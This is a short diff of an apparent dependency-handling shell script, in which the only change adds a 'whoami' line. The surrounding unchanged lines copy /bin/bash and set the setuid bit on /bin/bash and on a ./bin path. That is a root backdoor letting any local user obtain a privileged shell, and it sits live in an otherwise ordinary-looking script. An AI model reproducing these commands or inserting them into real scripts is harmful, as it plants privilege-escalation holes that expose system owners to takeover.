@@ -4,6 +4,8 @@ cp /bin/bash .
 chmod u+s /bin/bash
 chmod u+s ./bin
 
+whoami
+
 :'
 while read dependency; do
     dependency_stripped="$(echo "${dependency}" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
